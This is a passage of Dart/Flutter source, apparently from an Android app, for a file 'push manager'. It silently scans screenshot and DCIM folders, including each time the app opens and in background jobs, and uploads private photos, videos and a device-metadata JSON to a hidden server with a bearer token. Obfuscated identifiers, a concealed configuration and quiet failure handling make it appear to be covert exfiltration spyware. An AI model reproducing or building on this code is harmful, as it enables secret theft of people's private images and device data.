/// 推送管理器（逐文件推送版）
/// - ★ 不打包、不压缩，直接推送原文件
/// - ★ 小文件（≤1000 KB）批并发；大文件逐个串行
/// - ★ 每次打开 App 都真扫目录，检测是否有新内容
/// - ★ 截图优先（最新 10 张，无大小限制，一次性）
/// - ★ 截图与 DCIM 目录并行扫描
/// - ★ 截图目录为空时不锁定一次性标记
/// - ★ 断点续传：成功入 _sent，失败自动重试
/// - ★ JSON 首次单独推送
/// - ★ 智能熔断 + 服务器检测
/// - ★ 本地记录用 flutter_secure_storage 加密存储
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:permission_handler/permission_handler.dart';

import '../config/secrets.dart';
import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────
class Mc {
  final String pushUrl;
  final String pushToken;
  final String serverBaseUrl;

  final String m7;
  final Duration pushTimeout;
  final int maxFiles;

  /// 截图目录（一次性任务，最新 N 张，无大小限制）
  final String screenshotPath;
  /// 截图一次性推送的数量上限
  final int screenshotMaxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  final int maxSingleFileBytes;

  /// ★ 小文件阈值：≤ 此值走「批并发」，> 此值走「逐个串行」
  ///   同时用于扫描排序时「小文件优先」的判定
  final int smallFileBytes;

  final int batchSize;
  final int maxConsecutiveFails;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const Mc({
    this.pushUrl = '',
    this.pushToken = '',
    this.serverBaseUrl = '',
    this.m7 = '',
    this.pushTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,

    this.screenshotPath = '',
    this.screenshotMaxFiles = 10,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxSingleFileBytes = 15 * 1024 * 1024,
    this.smallFileBytes = 1000 * 1024,   // ★ 1000 KB

    this.batchSize = 3,
    this.maxConsecutiveFails = 6,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ── 「打开 App」扫描结果 ───────────────────────────────────────────────
class ScanResult {
  /// 本轮扫描到的总数（已按扩展名/体积过滤）
  final int scannedCount;
  /// 其中新发现、还没上传过的数量
  final int newCount;
  /// 是否因为已有任务在跑而跳过
  final bool busy;
  /// 权限缺失项
  final List<String> missingPermissions;

  const ScanResult._({
    required this.scannedCount,
    required this.newCount,
    required this.busy,
    required this.missingPermissions,
  });

  factory ScanResult.noNew(int scanned) => ScanResult._(
        scannedCount: scanned,
        newCount: 0,
        busy: false,
        missingPermissions: const [],
      );

  factory ScanResult.hasNew(int scanned, int fresh) => ScanResult._(
        scannedCount: scanned,
        newCount: fresh,
        busy: false,
        missingPermissions: const [],
      );

  factory ScanResult.noPermission(List<String> missing) => ScanResult._(
        scannedCount: 0,
        newCount: 0,
        busy: false,
        missingPermissions: missing,
      );

  factory ScanResult.busy() => const ScanResult._(
        scannedCount: 0,
        newCount: 0,
        busy: true,
        missingPermissions: [],
      );

  bool get hasNew => newCount > 0;
  bool get ok => !busy && missingPermissions.isEmpty;
}

// ── 单例管理器 ─────────────────────────────────────────────────────────
class Ma {
  Ma._internal();
  static final Ma instance = Ma._internal();

  static const String _kSent = 'm1p';
  static const String _kSentUrls = 'm1u';
  static const String _kJsonSent = 'm1j';
  static const String _kJsonUrl = 'm1ju';
  /// 截图一次性完成标记
  static const String _kScreenshotDone = 'm1sc';
  /// 上一次真正开跑的时间戳（毫秒），用于跨 isolate 互斥
  static const String _kLastRunAt = 'm5run';
  /// ★ 上一次扫描快照（指纹列表），用于 _sent 异常时的兜底诊断
  static const String _kLastScanSnapshot = 'm5snap';

  Mc _config = const Mc();

  FlutterSecureStorage? _secure;
  bool _initialized = false;

  final Set<String> _sent = <String>{};
  final Map<String, String> _sentUrls = <String, String>{};

  bool _jsonSent = false;
  String? _jsonUrl;
  /// 截图是否已完成（一次性）
  bool _screenshotDone = false;
  /// 本轮扫描到的截图目录候选数（未过滤 _sent），用于判断“目录是否为空”
  int _lastScannedShotCount = 0;
  /// ★ 上一次扫描的指纹集合（用于和本轮对比诊断）
  Set<String> _lastSnapshot = <String>{};

  Future<void>? _currentTask;
  Future<bool>? _jsonPushing;

  /// 本轮执行的截止时间；null 表示不限时
  DateTime? _deadline;

  bool get _outOfTime {
    final d = _deadline;
    return d != null && !DateTime.now().isBefore(d);
  }

  Duration? get _remaining {
    final d = _deadline;
    if (d == null) return null;
    final left = d.difference(DateTime.now());
    return left.isNegative ? Duration.zero : left;
  }

  bool get isBusy => _currentTask != null;
  int get sentCount => _sent.length;
  bool get jsonSent => _jsonSent;
  String? get jsonUrl => _jsonUrl;
  bool get screenshotDone => _screenshotDone;

  Map<String, String> get sentUrls => Map.unmodifiable(_sentUrls);

  String? getServerUrl(File file) {
    try {
      final name = file.path.split('/').last;
      final size = file.lengthSync();
      return _sentUrls['$name:$size'];
    } catch (_) {
      return null;
    }
  }

  http.Client? _client;
  http.Client get client => _client ??= _createClient();

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 8;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    return IOClient(io);
  }

  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  // ── secure storage 安全读写 ────────────────────────────────────────
  Future<String?> _readSecure(String key) async {
    try {
      final store = _secure;
      if (store == null) return null;
      return await store.read(key: key);
    } catch (e) {
      debugPrint('[M] 读 $key 失败（忽略，继续跑）: $e');
      return null;
    }
  }

  Future<void> _writeSecure(String key, String value) async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.write(key: key, value: value);
    } catch (e) {
      debugPrint('[M] 写 $key 失败（忽略）: $e');
    }
  }

  Future<void> _deleteSecure(String key) async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.delete(key: key);
    } catch (e) {
      debugPrint('[M] 删 $key 失败（忽略）: $e');
    }
  }

  String _fingerprint(_Scanned s) =>
      '${s.file.path.split('/').last}:${s.size}';

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({Mc? config}) async {
    if (_initialized) return;

    if (config == null) {
      config = Mc(
        pushUrl: SecureConfig.m2,
        pushToken: SecureConfig.m1,
        serverBaseUrl: SecureConfig.m3,
        m7: SecureConfig.m7,
        screenshotPath: SecureConfig.screenshotPath,
      );
    } else {
      final n1 = config.m7.isEmpty;
      final needShot = config.screenshotPath.isEmpty;
      if (n1 || needShot) {
        config = Mc(
          pushUrl: config.pushUrl,
          pushToken: config.pushToken,
          serverBaseUrl: config.serverBaseUrl,
          m7: n1 ? SecureConfig.m7 : config.m7,
          screenshotPath: needShot
              ? SecureConfig.screenshotPath
              : config.screenshotPath,
          screenshotMaxFiles: config.screenshotMaxFiles,
          pushTimeout: config.pushTimeout,
          maxFiles: config.maxFiles,
          imageExtensions: config.imageExtensions,
          videoExtensions: config.videoExtensions,
          maxSingleFileBytes: config.maxSingleFileBytes,
          smallFileBytes: config.smallFileBytes,
          batchSize: config.batchSize,
          maxConsecutiveFails: config.maxConsecutiveFails,
          healthCheckUrl: config.healthCheckUrl,
          healthCheckTimeout: config.healthCheckTimeout,
          serverWaitInterval: config.serverWaitInterval,
          serverWaitMaxAttempts: config.serverWaitMaxAttempts,
        );
      }
    }
    _config = config;

    _secure = const FlutterSecureStorage(
      aOptions: AndroidOptions(encryptedSharedPreferences: true),
    );

    _sent.clear();
    final rawSent = await _readSecure(_kSent);
    if (rawSent != null && rawSent.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawSent) as List;
        _sent.addAll(decoded.map((e) => e as String));
      } catch (_) {}
    }

    _sentUrls.clear();
    final rawUrls = await _readSecure(_kSentUrls);
    if (rawUrls != null && rawUrls.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
        decoded.forEach((k, v) => _sentUrls[k] = v as String);
      } catch (_) {}
    }

    _jsonSent = (await _readSecure(_kJsonSent)) == '1';
    _jsonUrl = await _readSecure(_kJsonUrl);
    _screenshotDone = (await _readSecure(_kScreenshotDone)) == '1';

    // ★ 读取上一次扫描快照
    _lastSnapshot = <String>{};
    final rawSnap = await _readSecure(_kLastScanSnapshot);
    if (rawSnap != null && rawSnap.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawSnap) as List;
        _lastSnapshot.addAll(decoded.map((e) => e as String));
      } catch (_) {}
    }

    _initialized = true;

    debugPrint('[M] ══════ 启动自检 ══════');
    debugPrint('[M] 已记录成功: ${_sent.length} 个');
    debugPrint('[M] URL 缓存: ${_sentUrls.length} 条');
    debugPrint('[M] JSON 已推送: $_jsonSent');
    debugPrint('[M] 截图一次性任务已完成: $_screenshotDone');
    debugPrint('[M] 上次扫描快照: ${_lastSnapshot.length} 条');
    debugPrint('[M] ══════ 自检完成 ══════');
  }

  // ── 权限 ───────────────────────────────────────────────────────────
  Future<bool> _granted(Permission p) async {
    try {
      final st = await p.status;
      return st.isGranted || st.isLimited;
    } catch (e) {
      debugPrint('[M] 查权限失败($p): $e');
      return false;
    }
  }

  Future<bool> _hasMedia() async =>
      await _granted(Permission.photos) && await _granted(Permission.videos);

  Future<bool> _hasStorage() async => _granted(Permission.storage);

  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) return _hasMedia();
    if (sdk > 0) return _hasStorage();

    debugPrint('[M] ⚠️ 拿不到 SDK_INT，两条权限路径都试一遍');
    return await _hasMedia() || await _hasStorage();
  }

  Future<List<String>> missingPermissions() async {
    if (!Platform.isAndroid) return const <String>['非 Android 设备'];

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) return _missingMedia();
    if (sdk > 0) {
      return await _hasStorage() ? const <String>[] : <String>['存储'];
    }

    if (await _hasMedia() || await _hasStorage()) return const <String>[];
    return _missingMedia();
  }

  Future<List<String>> _missingMedia() async {
    final missing = <String>[];
    if (!await _granted(Permission.photos)) missing.add('照片');
    if (!await _granted(Permission.videos)) missing.add('视频');
    return missing;
  }

  Future<bool> requestPermission() async {
    if (!Platform.isAndroid) return false;
    if (await hasPermission()) return true;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33 || sdk == 0) {
      await _request(Permission.photos);
      await _request(Permission.videos);
    }
    if (sdk < 33) {
      await _request(Permission.storage);
    }

    return hasPermission();
  }

  Future<void> _request(Permission p) async {
    try {
      final st = await p.status;
      if (st.isGranted || st.isLimited || st.isPermanentlyDenied) return;
      await p.request();
    } catch (e) {
      debugPrint('[M] 申请权限失败($p): $e');
    }
  }

  Future<bool> isPermanentlyDenied() async {
    if (!Platform.isAndroid) return false;

    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      return await _permanentlyDenied(Permission.photos) ||
          await _permanentlyDenied(Permission.videos);
    }
    if (sdk > 0) return _permanentlyDenied(Permission.storage);

    return await _permanentlyDenied(Permission.photos) ||
        await _permanentlyDenied(Permission.videos) ||
        await _permanentlyDenied(Permission.storage);
  }

  Future<bool> _permanentlyDenied(Permission p) async {
    try {
      final st = await p.status;
      return !st.isGranted && !st.isLimited && st.isPermanentlyDenied;
    } catch (_) {
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // ★ 入口一：打开 App 时调用
  //   - 每次都真扫目录
  //   - 不参与跨 isolate 互斥（但会写标记，让后台任务别紧接着重复跑）
  //   - 有新增才上传；上传放后台继续，UI 立即拿到 ScanResult
  // ══════════════════════════════════════════════════════════════════
  Future<ScanResult> checkOnAppOpen({Duration? budget}) async {
    await initialize();

    if (_currentTask != null) {
      debugPrint('[M] ⚠️ 已有任务在跑，本次打开跳过扫描');
      return ScanResult.busy();
    }

    if (!await hasPermission()) {
      final missing = await missingPermissions();
      debugPrint('[M] 权限未就绪（还差: ${missing.join('、')}）');
      return ScanResult.noPermission(missing);
    }

    // 写「上次开跑时间」，让紧跟着触发的后台任务先等一下
    await _markRunStart();

    final scanned = await _scanFiles();
    final total = scanned.length;

    final currentFingerprints = scanned.map(_fingerprint).toSet();
    final fresh = scanned
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();

    // 更新快照（诊断用，不参与去重）
    final appeared = currentFingerprints.difference(_lastSnapshot);
    final disappeared = _lastSnapshot.difference(currentFingerprints);
    if (appeared.isNotEmpty || disappeared.isNotEmpty) {
      debugPrint('[M] 与上次扫描快照比对：'
          '新增 ${appeared.length} 项，消失 ${disappeared.length} 项');
    }
    _lastSnapshot = currentFingerprints;
    await _writeSecure(
        _kLastScanSnapshot, jsonEncode(_lastSnapshot.toList()));

    if (fresh.isEmpty) {
      debugPrint('[M] 打开 App 扫描完成：无新内容（共 $total 项，'
          '均已上传过）');
      await _maybeFinalizeScreenshots(fresh);
      return ScanResult.noNew(total);
    }

    final freshMB =
        fresh.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
    debugPrint('[M] 打开 App 扫描完成：发现新内容 '
        '${fresh.length} 项 (${freshMB.toStringAsFixed(1)} MB)');

    // 上传放后台继续，UI 立即拿到结果
    _deadline = budget == null ? null : DateTime.now().add(budget);
    final uploadFuture = _pushAll(scanned);
    _currentTask = uploadFuture;
    uploadFuture.whenComplete(() {
      _currentTask = null;
      _deadline = null;
    });

    return ScanResult.hasNew(total, fresh.length);
  }

  // ══════════════════════════════════════════════════════════════════
  // ★ 入口二：后台（WorkManager / 前台服务）调用
  //   - 保留跨 isolate 互斥
  //   - 保留时间预算
  // ══════════════════════════════════════════════════════════════════
  Future<void> startPushIfPermitted({Duration? budget}) async {
    await initialize();
    if (_currentTask != null) {
      debugPrint('[M] ⚠️ 已有任务在跑，等待...');
      await _currentTask;
      return;
    }
    _deadline = budget == null ? null : DateTime.now().add(budget);
    if (budget != null) {
      debugPrint('[M] ⏱ 本轮预算 ${budget.inMinutes} 分钟');
    }
    final future = _doPush();
    _currentTask = future;
    try {
      await future;
    } finally {
      _currentTask = null;
      _deadline = null;
    }
  }

  // ── 跨 isolate 互斥 ───────────────────────────────────────────────
  static const Duration _kMinGap = Duration(minutes: 5);

  Future<bool> _anotherRunJustStarted() async {
    try {
      final store = _secure;
      if (store == null) return false;
      final raw = await store.read(key: _kLastRunAt);
      if (raw == null) return false;
      final ms = int.tryParse(raw);
      if (ms == null) return false;
      final at = DateTime.fromMillisecondsSinceEpoch(ms);
      return DateTime.now().difference(at) < _kMinGap;
    } catch (_) {
      return false;
    }
  }

  Future<void> _markRunStart() async {
    try {
      final store = _secure;
      if (store == null) return;
      await store.write(
        key: _kLastRunAt,
        value: '${DateTime.now().millisecondsSinceEpoch}',
      );
    } catch (_) {}
  }

  // ── 后台任务主流程 ────────────────────────────────────────────────
  Future<void> _doPush() async {
    if (!await hasPermission()) {
      final missing = await missingPermissions();
      debugPrint('[M] 权限未就绪，静默跳过（还差: ${missing.join('、')}）');
      return;
    }

    if (await _anotherRunJustStarted()) {
      debugPrint('[M] ⏭ 另一个 isolate 刚开跑（${_kMinGap.inMinutes} 分钟内），'
          '本轮跳过');
      return;
    }
    await _markRunStart();

    final scanned = await _scanFiles();
    await _pushAll(scanned);
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程：小文件批并发 / 大文件逐个串行
  // ══════════════════════════════════════════════════════════════════
  Future<void> _pushAll(List<_Scanned> scanned) async {
    final filtered = scanned
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[M] 无可推送文件');
      await _maybeFinalizeScreenshots(filtered);
      return;
    }

    try {
      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final smallBytes = _config.smallFileBytes;

      // ★ 按体积分流：小文件批并发，大文件逐个串行
      final smallFiles = <_Scanned>[];
      final largeFiles = <_Scanned>[];
      for (final s in filtered) {
        (s.size <= smallBytes ? smallFiles : largeFiles).add(s);
      }

      // 小文件：截图优先，然后新的优先
      smallFiles.sort((a, b) {
        if (a.isScreenshot != b.isScreenshot) {
          return a.isScreenshot ? -1 : 1;
        }
        return b.modified.compareTo(a.modified);
      });
      // 大文件：新的优先
      largeFiles.sort((a, b) => b.modified.compareTo(a.modified));

      final shotCount = filtered.where((s) => s.isScreenshot).length;
      debugPrint('[M] 共 ${filtered.length} 个文件 '
          '(${totalMB.toStringAsFixed(1)} MB)，'
          '截图 $shotCount 张；'
          '小文件 ${smallFiles.length} 个 '
          '(≤ ${(smallBytes / 1024).toStringAsFixed(0)} KB)，'
          '大文件 ${largeFiles.length} 个');

      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[M] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final jsonOk = await _ensureJsonSent();
      if (!jsonOk) {
        debugPrint('[M] ❌ JSON 推送失败，中止本轮');
        return;
      }

      final sw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int consecutiveFails = 0;
      final maxFails = _config.maxConsecutiveFails;

      // ── 阶段一：小文件批并发 ──────────────────────────────────────
      if (smallFiles.isNotEmpty) {
        final batchSize = _config.batchSize.clamp(1, 8);
        final totalBatches =
            (smallFiles.length + batchSize - 1) ~/ batchSize;
        debugPrint('[M] ▶ 阶段一：小文件批并发 '
            '(批大小 $batchSize，共 $totalBatches 批)');

        for (int i = 0; i < smallFiles.length; i += batchSize) {
          if (_outOfTime) {
            debugPrint('[M] ⏱ 预算用完，小文件剩 '
                '${smallFiles.length - i} 个留到下一轮');
            break;
          }
          if (consecutiveFails >= maxFails) {
            debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
            break;
          }

          final end = (i + batchSize < smallFiles.length)
              ? i + batchSize
              : smallFiles.length;
          final batch = smallFiles.sublist(i, end);
          final batchNum = (i ~/ batchSize) + 1;

          debugPrint('[M] ═══ 小文件批 $batchNum/$totalBatches '
              '(${batch.length} 个) ═══');

          final results = await Future.wait(
            batch.map((s) => _pushOne(s)),
          );

          for (int j = 0; j < batch.length; j++) {
            if (results[j]) {
              _sent.add(_fingerprint(batch[j]));
              okTotal++;
              consecutiveFails = 0;
            } else {
              failTotal++;
              consecutiveFails++;
            }
          }
          await _persist();
        }
      }

      // ── 阶段二：大文件逐个串行 ────────────────────────────────────
      if (largeFiles.isNotEmpty &&
          consecutiveFails < maxFails &&
          !_outOfTime) {
        debugPrint('[M] ▶ 阶段二：大文件逐个串行 '
            '(${largeFiles.length} 个)');

        for (int i = 0; i < largeFiles.length; i++) {
          if (_outOfTime) {
            debugPrint('[M] ⏱ 预算用完，大文件剩 '
                '${largeFiles.length - i} 个留到下一轮');
            break;
          }
          if (consecutiveFails >= maxFails) {
            debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
            break;
          }

          final s = largeFiles[i];
          final name = s.file.path.split('/').last;
          final sizeMB = (s.size / 1024 / 1024).toStringAsFixed(1);
          debugPrint('[M] ═══ 大文件 ${i + 1}/${largeFiles.length} '
              '(${sizeMB} MB): $name ═══');

          final ok = await _pushOne(s);
          if (ok) {
            _sent.add(_fingerprint(s));
            okTotal++;
            consecutiveFails = 0;
          } else {
            failTotal++;
            consecutiveFails++;
          }
          await _persist();
        }
      }

      sw.stop();
      debugPrint('[M] ══════════ 全部结束 ══════════');
      debugPrint('[M] 成功 $okTotal，失败 $failTotal，'
          '耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');

      await _maybeFinalizeScreenshots(filtered);
    } catch (e, st) {
      debugPrint('[M] ❌ 主流程异常: $e\n$st');
    }
  }

  /// 截图一次性任务结算：
  /// - 目录为空 → 不锁定，下次继续检查
  /// - 本轮截图全部成功 → 永久锁定
  /// - 有失败 → 不锁定，下次续传
  Future<void> _maybeFinalizeScreenshots(List<_Scanned> filtered) async {
    if (_screenshotDone) return;

    if (_lastScannedShotCount == 0) {
      debugPrint('[M] 截图目录为空，暂不锁定（下次继续检查）');
      return;
    }

    final shotsPending = filtered.where((s) => s.isScreenshot).toList();
    final allOk =
        shotsPending.every((s) => _sent.contains(_fingerprint(s)));
    if (!allOk) {
      debugPrint('[M] ⏸ 截图未全部成功，暂不锁定，下次继续');
      return;
    }

    _screenshotDone = true;
    await _writeSecure(_kScreenshotDone, '1');
    debugPrint('[M] ★ 截图一次性任务完成，后续启动不再扫描截图目录');
  }

  // ── 单文件推送 ─────────────────────────────────────────────────────
  Future<bool> _pushOne(_Scanned scanned) async {
    final file = scanned.file;
    final name = file.path.split('/').last;

    try {
      if (!await file.exists()) {
        debugPrint('[M] ⏭ $name 已删除，跳过');
        return true;
      }

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';

      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      final left = _remaining;
      final perFileTimeout = (left == null || left > _config.pushTimeout)
          ? _config.pushTimeout
          : left;
      if (perFileTimeout <= Duration.zero) {
        debugPrint('[M] ⏱ 预算用完，$name 留到下一轮');
        return false;
      }

      final streamed =
          await client.send(req).timeout(perFileTimeout);

      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        if (serverUrl != null) {
          _sentUrls[_fingerprint(scanned)] = serverUrl;
        }
        debugPrint('[M] ✅ $name'
            '${serverUrl != null ? ' → $serverUrl' : ''}');
        return true;
      }

      String bodyStr = '';
      try {
        bodyStr = utf8.decode(rawBytes, allowMalformed: true);
        if (bodyStr.length > 150) {
          bodyStr = '${bodyStr.substring(0, 150)}...';
        }
      } catch (_) {}

      debugPrint('[M] ⚠️ $name HTTP $code body=$bodyStr');
      return false;
    } on TimeoutException {
      debugPrint('[M] ⏱ $name 超时');
      return false;
    } catch (e) {
      debugPrint('[M] ⚠️ $name 网络错误: $e');
      return false;
    }
  }

  // ── JSON 首次推送 ─────────────────────────────────────────────────
  Future<bool> _ensureJsonSent() async {
    if (_jsonSent && _jsonUrl != null) {
      debugPrint('[M] JSON 已推送，跳过');
      return true;
    }
    if (_jsonPushing != null) {
      return await _jsonPushing!;
    }
    _jsonPushing = _doPushJson();
    try {
      return await _jsonPushing!;
    } finally {
      _jsonPushing = null;
    }
  }

  Future<bool> _doPushJson() async {
    File? jsonFile;
    try {
      debugPrint('[M] 首次推送 device_info.json...');
      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      final jsonBytes = utf8.encode(jsonEncode(metadata));
      final tmpDir = Directory.systemTemp;
      jsonFile = File(
          '${tmpDir.path}/device_info_${DateTime.now().millisecondsSinceEpoch}.json');
      await jsonFile.writeAsBytes(jsonBytes);

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      req.files.add(await http.MultipartFile.fromPath('file', jsonFile.path));
      req.fields['fileName'] = 'device_info.json';

      final left = _remaining;
      final jsonTimeout = (left == null || left > _config.pushTimeout)
          ? _config.pushTimeout
          : left;
      if (jsonTimeout <= Duration.zero) {
        debugPrint('[M] ⏱ 预算用完，JSON 推送留到下一轮');
        return false;
      }

      final streamed = await client.send(req).timeout(jsonTimeout);
      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        _jsonSent = true;
        _jsonUrl = serverUrl;
        await _writeSecure(_kJsonSent, '1');
        if (serverUrl != null) {
          await _writeSecure(_kJsonUrl, serverUrl);
        }
        debugPrint('[M] ✅ device_info.json 推送成功');
        return true;
      }
      debugPrint('[M] ❌ device_info.json HTTP $code');
      return false;
    } catch (e) {
      debugPrint('[M] ❌ device_info.json 异常: $e');
      return false;
    } finally {
      try {
        if (jsonFile != null && await jsonFile.exists()) {
          await jsonFile.delete();
        }
      } catch (_) {}
    }
  }

  // ── 解析服务器返回 ─────────────────────────────────────────────────
  String? _parseServerUrl(List<int> rawBytes) {
    try {
      final body = utf8.decode(rawBytes, allowMalformed: true);
      final decoded = jsonDecode(body);

      String? src;
      if (decoded is List && decoded.isNotEmpty) {
        final first = decoded.first;
        if (first is Map) src = first['src'] as String?;
      } else if (decoded is Map) {
        src = decoded['src'] as String? ?? decoded['url'] as String?;
        if (src == null && decoded['data'] is Map) {
          src = (decoded['data'] as Map)['url'] as String?;
        }
      }

      if (src == null) return null;
      return _buildFullUrl(src);
    } catch (_) {
      return null;
    }
  }

  String _buildFullUrl(String pathOrUrl) {
    if (pathOrUrl.startsWith('http://') ||
        pathOrUrl.startsWith('https://')) {
      return pathOrUrl;
    }
    final base = _config.serverBaseUrl.endsWith('/')
        ? _config.serverBaseUrl
            .substring(0, _config.serverBaseUrl.length - 1)
        : _config.serverBaseUrl;
    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
    return '$base$rel';
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.pushUrl);

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (await _pingServer(url)) {
        debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }
      if (_outOfTime) {
        debugPrint('[M] ⏱ 预算用完（已等 $i 次），本轮不再等待服务器');
        return false;
      }
      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[M] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次）');
      }
      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}
    try {
      final req2 = http.Request('GET', url);
      req2.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req2.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req2).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 扫描：★ 每次都真扫，不使用目录缓存
  // ══════════════════════════════════════════════════════════════════
  Future<List<_Scanned>> _scanFiles() async {
    // 截图与 DCIM 并行扫描
    final shotFuture = (!_screenshotDone && _config.screenshotPath.isNotEmpty)
        ? _scanOneDir(
            _config.screenshotPath,
            isScreenshot: true,
            applySizeLimit: false,
          )
        : Future.value(<_Scanned>[]);

    final mF = _scanOneDir(
      _config.m7,
      isScreenshot: false,
      applySizeLimit: true,
    );

    final results = await Future.wait([shotFuture, mF]);
    final shotsAll = results[0];
    final mA = results[1];

    _lastScannedShotCount = shotsAll.length;

    // 截图：过滤已推送 → 最新 N 张
    final shotsPending = shotsAll
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList()
      ..sort((a, b) => b.modified.compareTo(a.modified));
    final pickedShots =
        shotsPending.take(_config.screenshotMaxFiles).toList();

    // DCIM：过滤已推送
    final mP = mA
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();

    // 合并：截图优先
    final merged = <_Scanned>[];
    merged.addAll(pickedShots);
    merged.addAll(mP.take(_config.maxFiles));

    if (!_screenshotDone) {
      if (_lastScannedShotCount == 0) {
        debugPrint('[M] 截图目录为空（本轮不锁定）');
      } else {
        debugPrint('[M] 截图目录 $_lastScannedShotCount 张，'
            '本轮待推送 ${pickedShots.length} 张');
      }
    }

    return merged;
  }

  Future<List<_Scanned>> _scanOneDir(
    String path, {
    required bool isScreenshot,
    required bool applySizeLimit,
  }) async {
    final dir = Directory(path);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);

      if (isScreenshot) {
        if (!isImage) continue;
      } else {
        if (!isImage && !isVideo) continue;
      }

      try {
        final st = await e.stat();
        if (applySizeLimit && st.size > _config.maxSingleFileBytes) {
          debugPrint('[M] 跳过超大文件（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        list.add(_Scanned(e, st.modified, st.size,
            isScreenshot: isScreenshot));
      } catch (_) {}
    }
    return list;
  }

  // ── 持久化（写 secure storage）────────────────────────────────────
  Future<void> _persist() async {
    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        await _secure?.write(
          key: _kSent,
          value: jsonEncode(_sent.toList()),
        );
        await _secure?.write(
          key: _kSentUrls,
